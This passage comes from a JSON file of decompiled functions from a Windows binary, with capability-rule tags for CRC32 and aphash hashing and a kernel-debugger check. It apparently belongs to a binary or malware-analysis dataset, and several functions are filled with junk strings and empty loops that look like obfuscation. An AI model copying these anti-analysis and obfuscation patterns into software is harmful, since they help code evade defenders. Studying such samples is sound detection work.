1) != 0) {\n        for (iStack156 = 5; 0 < iStack156; iStack156 = iStack156 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 707
    },
    "00405a38": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00405a38(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack264;\n    int32_t iStack260;\n    int32_t iStack256;\n    uchar auStack252 [24];\n    uchar auStack228 [24];\n    int32_t iStack204;\n    uchar auStack200 [24];\n    uchar auStack176 [24];\n    uint uStack152;\n    uint uStack148;\n    uchar uStack89;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffee0;\n    uStack28 = 0x417ff0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40e25100;\n    uStack48 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"swwyhljyqzjjevanbmuhjklddrzayslqsdzkqlzzamjybsrjwakpqmilejasgapfruxpkrxqznj\");\n    uStack76 = 0x40abf400;\n    uStack80 = 0;\n    uStack84 = 0x40c38480;\n    uStack88 = 0;\n    uStack89 = 1;\n    uStack24 = 1;\n    fcn.00401e79(\"kwluvloxvsxasaonaenhf\");\n    uStack24 = 2;\n    fcn.00401e79(\"chuojnwpthwplmqkjqckavyfkaopentktglfdfndzubtqjxxsdldc\");\n    uStack148 = 0x40cc4c00;\n    uStack152 = 0;\n    uStack24 = 3;\n    fcn.00401e79(\"swwyhljyqzjjevanbmuhjklddrzayslqsdzkqlzzamjybsrjwakpqmilejasgapfruxpkrxqznj\");\n    uStack24 = 5;\n    fcn.00401e79(\"swwyhljyqzjjevanbmuhjklddrzayslqsdzkqlzzamjybsrjwakpqmilejasgapfruxpkrxqznj\");\n    uVar1 = fcn.00405b37(auStack200, auStack176);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack204 = 0x2d; 0 < iStack204; iStack204 = iStack204 + -1) {\n        }\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"swwyhljyqzjjevanbmuhjklddrzayslqsdzkqlzzamjybsrjwakpqmilejasgapfruxpkrxqznj\");\n    uStack24 = 4;\n    fcn.00401e79(\"swwyhljyqzjjevanbmuhjklddrzayslqsdzkqlzzamjybsrjwakpqmilejasgapfruxpkrxqznj\");\n    uVar1 = fcn.004042dc(auStack252, auStack228);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack256 = 0x37; 0 < iStack256; iStack256 = iStack256 + -1) {\n        }\n    }\n    for (iStack260 = 0x4a; 0 < iStack260; iStack260 = iStack260 + -1) {\n    }\n    for (iStack264 = 0x29; 0 < iStack264; iStack264 = iStack264 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x4ec214;\n}\n",
        "token_count": 1026
    },
    "00405a65": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00405a65(uint *param_1)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00401bd6();\n    var_8h = param_1;\n    if ((uVar1 & 1) != 0) {\n        var_8h = fcn.00402216(*param_1);\n    }\n    return var_8h;\n}\n",
        "token_count": 113
    },
    "00405ac9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00405ac9(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.0040137f();\n    arg_8h_00 = fcn.0040137f();\n    uVar1 = fcn.00402cf2(arg_8h_00);\n    var_1h._0_1_ = false;\n    if ((uVar1 & 1) != 0) {\n        iVar2 = fcn.0040597f();\n        iVar3 = fcn.0040597f();\n        var_1h._0_1_ = iVar2 == iVar3;\n    }\n    return var_1h._0_1_;\n}\n",
        "token_count": 226
    },
    "00405ace": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.00405ace(uint arg_8h, uint noname_1, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint arg_2ch, uint noname_10, uint arg_34h)\n\n{\n    uint var_bp_4h;\n    \n    return 0;\n}\n",
        "token_count": 117
    },
    "00405b28": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b28(uint arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_a0h;\n    uint var_94h;\n    uint var_84h;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_28h;\n    uint var_24h;\n    uint8_t var_1dh;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff04;\n    var_10h = 0xffffffff;\n    var_14h = 0x4272a0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_1dh = arg_ch & 1;\n    var_28h = fcn.00403319();\n    fcn.00403d46(&var_54h);\n    *(in_ECX + 8) = 0;\n    *(in_ECX + 0x10) = 0;\n    *(in_ECX + 0x14) = 0;\n    var_10h = 0;\n    fcn.00403d46(&var_84h);\n    if ((var_1dh & 1) == 0) {\n        var_b8h = *(var_28h + 8);\n    }\n    else {\n        var_b8h = 0x544a21;\n    }\n    uVar2 = fcn.00401cc1(var_b8h, 0, &var_84h);\n    *(in_ECX + 8) = uVar2;\n    uVar2 = fcn.0040108c();\n    uVar2 = fcn.00401cc1(uVar2, 0, &var_54h);\n    *(in_ECX + 0x10) = uVar2;\n    uVar2 = fcn.00401960();\n    uVar2 = fcn.00401cc1(uVar2, 0, &var_54h);\n    *(in_ECX + 0x14) = uVar2;\n    var_58h = 0;\n    if ((var_1dh & 1) == 0) {\n        fcn.00405830(&var_b0h, &var_54h);\n        fcn.00404728(0, var_28h, var_b0h);\n    }\n    else {\n        uVar1 = fcn.00404c82(0x2e, 0, &var_54h);\n        *(in_ECX + 0xc) = uVar1;\n        uVar1 = fcn.00404c82(0x2c, 0, &var_54h);\n        *(in_ECX + 0xd) = uVar1;\n    }\n    fcn.0040483b();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 725
    },
    "00405b37": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint8_t __cdecl fcn.00405b37(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = fcn.0040141f(arg_ch);\n    return uVar1 & 1;\n}\n",
        "token_count": 58
    },
    "00405b73": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405b73(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint var_8ch;\n    uint var_74h;\n    uint var_5ch;\n    uint var_58h;\n    uchar var_3dh;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff44;\n    var_14h = 0x450d40;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    fcn.00401e79(\"cakqrhunxqcmtfxmqllpmzt\");\n    var_3ch = 0x8ac;\n    var_3dh = 1;\n    var_10h = 1;\n    fcn.00401e79(\"sizcimqzkpbjcbfslbkcohygdbeyqgisajrqfbdanvhtrqprdpgchmvjqcaaurhzpouztpoaibali\");\n    var_5ch = 0x688;\n    var_10h = 2;\n    fcn.00401e79(\"yustuabhdatpodmyjkcgxinvbypoqcxzvlafmyssdacuvhyuknkpfvpuwrtldrvrqbxkxazxjdlllscgcyxqp\");\n    var_10h = 3;\n    fcn.00401e79(\"sizcimqzkpbjcbfslbkcohygdbeyqgisajrqfbdanvhtrqprdpgchmvjqcaaurhzpouztpoaibali\");\n    var_10h = 4;\n    fcn.00401e79(\"sizcimqzkpbjcbfslbkcohygdbeyqgisajrqfbdanvhtrqprdpgchmvjqcaaurhzpouztpoaibali\");\n    uVar1 = fcn.004042dc(&var_a4h, &var_8ch);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_a8h = 0x4a; 0 < var_a8h; var_a8h = var_a8h + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0x108f;\n}\n",
        "token_count": 657
    },
    "00405b8c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b8c(uint arg_8h)\n\n{\n    return;\n}\n",
        "token_count": 23
    },
    "00405baa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00405baa(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack232;\n    uchar auStack228 [24];\n    uchar auStack204 [24];\n    int32_t iStack180;\n    uchar auStack176 [24];\n    uchar auStack152 [24];\n    int32_t iStack128;\n    uchar auStack124 [24];\n    uchar auStack100 [24];\n    int32_t iStack76;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff00;\n    uStack28 = 0x4511e0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40eb8860;\n    uStack48 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"xlpkiwhoibsmkngxltnxyxwkmoxpugselhgzykrjfnwybacsnqluinogjk\");\n    for (iStack76 = 4; 0 < iStack76; iStack76 = iStack76 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"xlpkiwhoibsmkngxltnxyxwkmoxpugselhgzykrjfnwybacsnqluinogjk\");\n    uStack24 = 5;\n    fcn.00401e79(\"xlpkiwhoibsmkngxltnxyxwkmoxpugselhgzykrjfnwybacsnqluinogjk\");\n    uVar1 = fcn.004042dc(auStack124, auStack100);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack128 = 0x4a; 0 < iStack128; iStack128 = iStack128 + -1) {\n        }\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"xlpkiwhoibsmkngxltnxyxwkmoxpugselhgzykrjfnwybacsnqluinogjk\");\n    uStack24 = 4;\n    fcn.00401e79(\"xlpkiwhoibsmkngxltnxyxwkmoxpugselhgzykrjfnwybacsnqluinogjk\");\n    uVar1 = fcn.004042dc(auStack176, auStack152);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack180 = 6; 0 < iStack180; iStack180 = iStack180 + -1) {\n        }\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"xlpkiwhoibsmkngxltnxyxwkmoxpugselhgzykrjfnwybacsnqluinogjk\");\n    uStack24 = 3;\n    fcn.00401e79(\"xlpkiwhoibsmkngxltnxyxwkmoxpugselhgzykrjfnwybacsnqluinogjk\");\n    uVar1 = fcn.00405b37(auStack228, auStack204);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack232 = 0x53; 0 < iStack232; iStack232 = iStack232 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x5471b4;\n}\n",
        "token_count": 921
    },
    "00405baf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405baf(uint *param_1)\n\n{\n    uint32_t uVar1;\n    uint var_14h;\n    ushort var_eh;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = param_1;\n    fcn.00401b09();\n    uVar1 = fcn.00401bd6();\n    if ((uVar1 & 1) != 0) {\n        var_8h = *param_1;\n        var_ch = fcn.004021e9();\n        fcn.00404052(param_1);\n        fcn.00406082(var_8h, param_1[5] + 1);\n    }\n    param_1[4] = 0;\n    param_1[5] = 7;\n    var_eh = 0;\n    fcn.00401456(param_1, &var_eh);\n    return;\n}\n",
        "token_count": 215
    },
    "00405c13": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar ** __cdecl fcn.00405c13(char **arg_8h, int32_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    char **ppcVar2;\n    uint uVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    char *var_1ch;\n    char *var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    uint var_1h;\n    \n    if (**0x574458 == 0) {\n        fcn.0040129e(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    uVar5 = **0x574458;\n    puVar4 = *0x574458 + 1;\n    var_ch = NULL;\n    var_8h = NULL;\n    if (uVar5 < 0x59) {\n    // switch table (17 cases) at 0x48e02b\n        switch(uVar5) {\n        case 0x43:\n        case 0x44:\n        case 0x45:\n            var_1ch = \"char\";\n            goto code_r0x0048dbc0;\n        case 0x46:\n        case 0x47:\n            var_1ch = \"short\";\n            var_18h = 0x5;\n            break;\n        case 0x48:\n        case 0x49:\n            var_1ch = 0x555a78;\n            var_18h = 0x3;\n            break;\n        case 0x4a:\n        case 0x4b:\n            var_1ch = \"long\";\ncode_r0x0048dbc0:\n            var_18h = 0x4;\n            break;\n        case 0x4c:\n            goto code_r0x0048dc73;\n        case 0x4d:\n            var_1ch = \"float\";\n            var_18h = 0x5;\n            goto code_r0x0048dc0f;\n        case 0x4f:\n            var_1ch = \"long \";\n            var_18h = 0x5;\n            *0x574458 = puVar4;\n            fcn.004022f7(&var_1ch);\n            puVar4 = *0x574458;\n        case 0x4e:\n            *0x574458 = puVar4;\n            var_1ch = \"double\";\n            var_18h = 0x6;\n            fcn.00405d71(&var_1ch);\n            goto code_r0x0048dc98;\n        case 0x50:\n        case 0x51:\n        case 0x52:\n        case 0x53:\n            uVar5 = uVar5 & 3;\n            *0x574458 = puVar4;\ncode_r0x0048de93:\n            var_ch = NULL;\n            var_8h = NULL;\n            var_1ch = *arg_ch;\n            var_18h = arg_ch[1];\n            if (uVar5 != 0xfffffffe) {\n                if (var_1ch == NULL) {\n                    if ((uVar5 & 1) == 0) {\n                        if ((uVar5 & 2) != 0) {\n                            var_14h = \"volatile\";\n                            var_10h = 0x8;\n                            fcn.004022f7(&var_14h);\n                        }\n                    }\n                    else {\n                        var_14h = \"const\";\n                        var_10h = 0x5;\n                        fcn.004022f7(&var_14h);\n                        if ((uVar5 & 2) != 0) {\n                            var_14h = \" volatile\";\n                            var_10h = 0x9;\n                            fcn.00405d71(&var_14h);\n                        }\n                    }\n                }\n                fcn.00404cfa(arg_8h, &var_ch, &var_1ch, 1);\n                return arg_8h;\n            }\n            var_18h = var_18h | 0x800;\n            fcn.00404cfa(&var_14h, &var_ch, &var_1ch, 0);\n            if ((var_10h & 0x800) == 0) {\n                var_1ch = 0x55513c;\n                var_18h = 0x2;\n                fcn.00405d71(&var_1ch);\n            }\n            goto code_r0x0048e008;\n        default:\n            var_1ch = \"void\";\n            var_18h = 0x4;\ncode_r0x0048dc0f:\n            *0x574458 = puVar4;\n            fcn.004022f7(&var_1ch);\n            goto code_r0x0048dd9d;\n        }\n        *0x574458 = puVar4;\n        fcn.004022f7(&var_1ch);\ncode_r0x0048dc98:\n        if (uVar5 != 0x43) {\n            if ((((uVar5 != 0x45) && (uVar5 != 0x47)) && (uVar5 != 0x49)) && (uVar5 != 0x4b)) {\n                uVar1 = 0;\n                if (uVar5 != 0x5f) goto code_r0x0048dd9d;\n                goto code_r0x0048dd54;\n            }\n            goto code_r0x0048dd6f;\n        }\n        var_1ch = \"signed \";\n        var_18h = 0x7;\n        goto code_r0x0048dd76;\n    }\n    if (uVar5 != 0x5f) {\ncode_r0x0048dc73:\n        ppcVar2 = fcn.00401361(&var_1ch);\n        var_14h = *ppcVar2;\n        var_10h = ppcVar2[1];\n        var_ch = var_14h;\n        var_8h = var_10h;\n        if (var_14h == NULL) {\ncode_r0x0048e008:\n            *arg_8h = var_14h;\n            arg_8h[1] = var_10h;\n            return arg_8h;\n        }\n        goto code_r0x0048dc98;\n    }\n    var_1h._0_1_ = *puVar4;\n    *0x574458 = *0x574458 + 2;\n    if (var_1h < 0x4e) {\n        if (var_1h == 0x4d) {\ncode_r0x0048de50:\n            var_1ch = \"__int128\";\n            goto code_r0x0048de57;\n        }\n        if (var_1h < 0x48) {\n            if (var_1h != 0x47) {\n                if (var_1h == 0) {\n                    *0x574458 = puVar4;\n                    fcn.00402eb9(1);\n                    uVar1 = var_1h;\n                    goto code_r0x0048dd54;\n                }\n                if (var_1h == 0x24) {\n                    var_1ch = \"__w64 \";\n                    var_18h = 0x6;\n                    uVar3 = fcn.00405c13(&var_14h, arg_ch);\n                    fcn.004040cf(arg_8h, &var_1ch, uVar3);\n                    return arg_8h;\n                }\n                if ((var_1h == 0x44) || (var_1h == 0x45)) {\n                    var_1ch = \"__int8\";\n                    var_18h = 0x6;\n                    goto code_r0x0048dd45;\n                }\n                if (var_1h != 0x46) goto code_r0x0048dd37;\n            }\n            var_1ch = \"__int16\";\n        }\n        else if ((var_1h == 0x48) || (var_1h == 0x49)) {\n            var_1ch = \"__int32\";\n        }\n        else {\n            if ((var_1h != 0x4a) && (var_1h != 0x4b)) {\n                if (var_1h != 0x4c) goto code_r0x0048dd37;\n                goto code_r0x0048de50;\n            }\n            var_1ch = \"__int64\";\n        }\n        goto code_r0x0048dd3e;\n    }\n    // switch table (12 cases) at 0x48e063\n    switch(var_1h) {\n    case 0x4e:\n        var_1ch = \"bool\";\n        goto code_r0x0048df7e;\n    case 0x4f:\n        uVar5 = 0xfffffffe;\n        goto code_r0x0048de93;\n    case 0x50:\n        var_1ch = \"auto\";\ncode_r0x0048df7e:\n        var_18h = 0x4;\n        break;\n    case 0x51:\n        var_1ch = \"char8_t\";\n        goto code_r0x0048dd3e;\n    case 0x52:\n        var_1ch = \"<unknown>\";\n        var_18h = 0x9;\n        break;\n    case 0x53:\n        var_1ch = \"char16_t\";\n        goto code_r0x0048de57;\n    case 0x54:\n        var_1ch = \"decltype(auto)\";\n        var_18h = 0xe;\n        break;\n    case 0x55:\n        var_1ch = \"char32_t\";\ncode_r0x0048de57:\n        var_18h = 0x8;\n        break;\n    default:\ncode_r0x0048dd37:\n        var_1ch = \"UNKNOWN\";\n        goto code_r0x0048dd3e;\n    case 0x57:\n        var_1ch = \"wchar_t\";\ncode_r0x0048dd3e:\n        var_18h = 0x7;\n        break;\n    case 0x58:\n    case 0x59:\n        *0x574458 = puVar4;\n        ppcVar2 = fcn.00401361(&var_1ch);\n        var_14h = *ppcVar2;\n        var_10h = ppcVar2[1];\n        uVar1 = var_1h;\n        var_ch = var_14h;\n        var_8h = var_10h;\n        if (var_14h == NULL) goto code_r0x0048e008;\n        goto code_r0x0048dd54;\n    }\ncode_r0x0048dd45:\n    fcn.004022f7(&var_1ch);\n    uVar1 = var_1h;\ncode_r0x0048dd54:\n    if ((((uVar1 == 0x45) || (uVar1 == 0x47)) || (uVar1 == 0x49)) || ((uVar1 == 0x4b || (uVar1 == 0x4d)))) {\ncode_r0x0048dd6f:\n        var_18h = 0x9;\n        var_1ch = \"unsigned \";\ncode_r0x0048dd76:\n        fcn.00402d47(&var_1ch);\n        fcn.004053b7(&var_1ch, &var_ch);\n        var_ch = var_1ch;\n        var_8h = var_18h;\n    }\ncode_r0x0048dd9d:\n    if (*arg_ch != 0) {\n        uVar3 = fcn.00402eb4(&var_1ch, 0x20, arg_ch);\n        fcn.00402eeb(uVar3);\n    }\n    *arg_8h = var_ch;\n    arg_8h[1] = var_8h;\n    return arg_8h;\n}\n",
        "token_count": 2722
    },
    "00405c4a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00405c4a(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack224;\n    uchar auStack220 [24];\n    uchar auStack196 [24];\n    int32_t iStack172;\n    uchar auStack168 [24];\n    uchar auStack144 [27];\n    uchar uStack117;\n    uchar uStack89;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff00;\n    uStack28 = 0x450180;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x1928;\n    uStack24 = 2;\n    fcn.00401e79(\"pbxclsrrpxzmaezyuacvtzglxpdqpqambirwifqpivuqlcrfnghzllnfzfmofftp\");\n    uStack72 = 0x12b4;\n    uStack76 = 0x40bbb900;\n    uStack80 = 0;\n    uStack84 = 0x40ce0380;\n    uStack88 = 0;\n    uStack89 = 1;\n    uStack24 = 3;\n    fcn.00401e79(\"wfxwelatasexrlfvwxlezovhdtylonzprtmttzrhddodfclwtewclo\");\n    uStack117 = 0;\n    uStack24 = 4;\n    fcn.00401e79(\"wfxwelatasexrlfvwxlezovhdtylonzprtmttzrhddodfclwtewclo\");\n    uStack24 = 6;\n    fcn.00401e79(\"wfxwelatasexrlfvwxlezovhdtylonzprtmttzrhddodfclwtewclo\");\n    uVar1 = fcn.004042dc(auStack168, auStack144);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack172 = 0x46; 0 < iStack172; iStack172 = iStack172 + -1) {\n        }\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"pbxclsrrpxzmaezyuacvtzglxpdqpqambirwifqpivuqlcrfnghzllnfzfmofftp\");\n    uStack24 = 5;\n    fcn.00401e79(\"pbxclsrrpxzmaezyuacvtzglxpdqpqambirwifqpivuqlcrfnghzllnfzfmofftp\");\n    uVar1 = fcn.00405b37(auStack220, auStack196);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack224 = 0x4e; 0 < iStack224; iStack224 = iStack224 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 833
    },
    "00405c59": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00405c59(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack280;\n    uchar auStack276 [24];\n    uchar auStack252 [24];\n    int32_t iStack228;\n    uchar auStack224 [24];\n    uchar auStack200 [24];\n    int32_t iStack176;\n    int32_t iStack172;\n    uchar auStack168 [24];\n    uchar auStack144 [24];\n    int32_t iStack120;\n    uchar uStack89;\n    uint uStack88;\n    uint uStack84;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffec8;\n    uStack28 = 0x44fee0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40d791c0;\n    uStack48 = 0;\n    uStack52 = 0x40d8bc80;\n    uStack56 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"cqjbudviuxz\");\n    uStack84 = 0x40c1c700;\n    uStack88 = 0;\n    uStack89 = 0;\n    uStack24 = 3;\n    fcn.00401e79(\"bovmxgxakaexkltdgraxzpjcglejrjh\");\n    for (iStack120 = 0x47; 0 < iStack120; iStack120 = iStack120 + -1) {\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"cqjbudviuxz\");\n    uStack24 = 7;\n    fcn.00401e79(\"cqjbudviuxz\");\n    uVar1 = fcn.00405b37(auStack168, auStack144);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack172 = 0x19; 0 < iStack172; iStack172 = iStack172 + -1) {\n        }\n    }\n    for (iStack176 = 0x36; 0 < iStack176; iStack176 = iStack176 + -1) {\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"bovmxgxakaexkltdgraxzpjcglejrjh\");\n    uStack24 = 6;\n    fcn.00401e79(\"bovmxgxakaexkltdgraxzpjcglejrjh\");\n    uVar1 = fcn.004042dc(auStack224, auStack200);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack228 = 0x2d; 0 < iStack228; iStack228 = iStack228 + -1) {\n        }\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"cqjbudviuxz\");\n    uStack24 = 5;\n    fcn.00401e79(\"cqjbudviuxz\");\n    uVar1 = fcn.00405b37(auStack276, auStack252);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack280 = 2; 0 < iStack280; iStack280 = iStack280 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x5468d4;\n}\n",
        "token_count": 949
    },
    "00405c81": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nfloat10 __cdecl\nfcn.00405c81(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint noname_4, uint arg_1ch, uint noname_6, \n            uint arg_24h)\n\n{\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    \n    for (iStack56 = 0x54; 0 < iStack56; iStack56 = iStack56 + -1) {\n    }\n    for (iStack60 = 0x1c; 0 < iStack60; iStack60 = iStack60 + -1) {\n    }\n    for (iStack64 = 0x5e; 0 < iStack64; iStack64 = iStack64 + -1) {\n    }\n    return *0x546984;\n}\n",
        "token_count": 196
    },
    "00405cc2": {
        "rules": [
